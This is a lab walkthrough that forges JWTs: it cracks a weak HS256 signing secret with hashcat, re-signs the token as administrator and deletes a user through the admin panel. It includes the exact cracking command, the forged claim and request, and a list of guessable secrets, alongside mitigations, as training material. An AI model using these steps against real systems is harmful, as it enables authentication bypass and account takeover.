# Lab03 - JWT Authentication Bypass Via Weak Signing Key

## Objective

Brute-force the JWT signing secret.

Use the recovered secret to sign a modified JWT and gain access to:

```text
/admin
```

Then delete:

```text
carlos
```

Credentials:

```text
wiener:peter
```

---

# Vulnerability Overview

The application uses a weak secret key for signing and verifying JWTs.

The JWT uses a symmetric signing algorithm.

A weak secret can be recovered offline using Hashcat.

---

# Attack Flow

```text
Capture Valid JWT
        ↓
Brute-Force Secret
        ↓
Recover Signing Key
        ↓
Modify Claims
        ↓
Re-Sign JWT
        ↓
Administrator Access
```

---

# Part 1 - Brute-Force The Secret Key

## Step 1 - Load JWT Editor

In Burp Suite, install:

```text
JWT Editor
```

from the BApp Store.

---

## Step 2 - Log In

Log in:

```text
wiener:peter
```

Send the post-login request to Repeater:

```http
GET /my-account
```

---

## Step 3 - Test Admin Access

Change the path to:

```http
GET /admin
```

The application denies access.

---

## Step 4 - Copy The JWT

Copy the complete JWT session token.

Example structure:

```text
HEADER.PAYLOAD.SIGNATURE
```

---

## Step 5 - Brute-Force Using Hashcat

Run:

```bash
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
```

Hashcat mode:

```text
16500 = JWT
```

Attack mode:

```text
-a 0 = Dictionary Attack
```

---

## Step 6 - Recover The Secret

Hashcat identifies:

```text
secret1
```

If Hashcat has already cracked the JWT, use:

```bash
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list --show
```

Recovered secret:

```text
secret1
```

---

# Part 2 - Generate A Forged Signing Key

## Step 7 - Base64 Encode The Secret

Using Burp Decoder, Base64 encode:

```text
secret1
```

---

## Step 8 - Create A Symmetric Key

Go to:

```text
JWT Editor Keys
        ↓
New Symmetric Key
```

Click:

```text
Generate
```

A JWK structure is generated.

---

## Step 9 - Replace The `k` Property

Replace the generated `k` value with the Base64-encoded secret.

Concept:

```json
{
  "kty": "oct",
  "k": "BASE64_ENCODED_SECRET"
}
```

Save the key.

---

# Part 3 - Modify And Sign The JWT

## Step 10 - Modify The Payload

Return to:

```http
GET /admin
```

Open the JSON Web Token editor.

Change:

```json
{
  "sub": "wiener"
}
```

To:

```json
{
  "sub": "administrator"
}
```

---

## Step 11 - Sign The JWT

Click:

```text
Sign
```

Select the symmetric key created using:

```text
secret1
```

Enable:

```text
Don't modify header
```

Click:

```text
OK
```

---

## Step 12 - Access Admin Panel

Send:

```http
GET /admin
```

The JWT now has a valid signature.

Administrator access is granted.

---

## Step 13 - Delete Carlos

Send:

```http
GET /admin/delete?username=carlos
```

Lab solved.

---

# Exact Command Used

```bash
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
```

Recovered key:

```text
secret1
```

---

# Why The Attack Works

The server correctly verifies JWT signatures.

However:

```text
Signing Secret Is Weak
```

Therefore:

```text
Valid JWT
        ↓
Offline Brute Force
        ↓
Secret Recovered
        ↓
Attacker Can Sign Any JWT
```

Signature verification becomes useless once the signing secret is known.

---

# Personal Analysis & Testing Process

This lab taught me an important distinction:

```text
Signature Verification Exists
        ≠
JWT Is Secure
```

The key question is:

```text
How Strong Is The Signing Key?
```

My testing flow:

```text
Identify HS Algorithm
        ↓
Capture Valid JWT
        ↓
Offline Secret Testing
        ↓
Recover Secret
        ↓
Forge JWT
```

---

# Bug Bounty Indicators

Look for:

```text
HS256
HS384
HS512
Symmetric JWT Signing
Default Secrets
Development Secrets
Placeholder Secrets
```

Possible secret patterns:

```text
secret
secret1
password
jwtsecret
changeme
```

Only perform brute-force testing where explicitly authorized by the program scope.

---

# Impact

```text
JWT Forgery
Authentication Bypass
Privilege Escalation
Account Impersonation
Potential Account Takeover
```

---

# Mitigation

- Use cryptographically random signing secrets.
- Use sufficient entropy.
- Never use default or example secrets.
- Rotate exposed signing keys.
- Store secrets securely.

---

# Related Theory

```text
03-jwt-signatures.md
08-bruteforcing-secret-keys.md
```

---

# Key Learnings

- HS256 security depends on secret strength.
- JWT secrets can be tested offline.
- A recovered secret allows arbitrary token signing.
- Signature verification alone is not enough if the key is weak.